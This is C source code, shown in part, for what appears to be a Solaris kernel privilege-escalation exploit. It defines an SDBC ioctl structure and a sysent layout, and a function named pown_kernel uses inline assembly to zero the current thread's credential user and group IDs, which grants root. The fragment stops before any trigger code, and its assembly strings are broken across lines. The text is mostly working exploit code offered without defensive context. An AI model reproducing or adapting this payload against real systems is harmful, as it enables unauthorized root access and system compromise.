#include <sys/syscall.h>
#include <unistd.h>
#define SDBC(a)         (('B'<<16)|('C'<<8)|(a))
#define SDBC_TEST_INIT  SDBC(5)
typedef struct _sdbc_ioctl {
  long arg0;
  long arg1;
  long arg2;
  long arg3;
  long arg4;
  long magic;
  long ustatus;
  long pad[1];
} _sdbc_ioctl_t;
typedef struct _sysent_s {
  char sy_narg;
#ifdef _LP64
  unsigned short sy_flags;
#else
  unsigned char sy_flags;
#endif
  int (*sy_call)();
  void *sy_lock;
  void *sy_callc;
} _sysent_t;
#ifdef _LP64
# define KTHREAD  0x18
#else
# define KTHREAD  0x10
#endif
#define XSTRINGY(a)     STRINGY(a)
#define STRINGY(a)      #a
int
pown_kernel (void)
{
#ifdef _LP64
  __asm__ ( "mov %gs:" XSTRINGY(KTHREAD) ", %rax
"
            "mov 0x1c8(%rax), %rax
"
            "movl $0x0, 0x4(%rax)
"    /* kthread_t->t_cred->cr_uid */
            "movl $0x0, 0x8(%rax)
"    /* kthread_t->t_cred->cr_gid */
            "movl $0x0, 0xc(%rax)
"    /* kthread_t->t_cred->cr_ruid */
            "movl $0x0, 0x10(%rax)");   /* kthread_t->t_cred->cr_rgid */
#else
  __asm__ ( "mov %gs:" XSTRINGY(KTHREAD) ", %eax
"
            "mov 0xdc(%eax), %eax
"
            "mov 0x14(%eax), %eax
"
            "movl $0x0, 0x4(%eax)
"
            "movl $0x0, 0x8(%eax)
"
            "movl $0x0, 0xc(%eax)
"
            "movl $0x0, 0x10(%eax)");
#endif
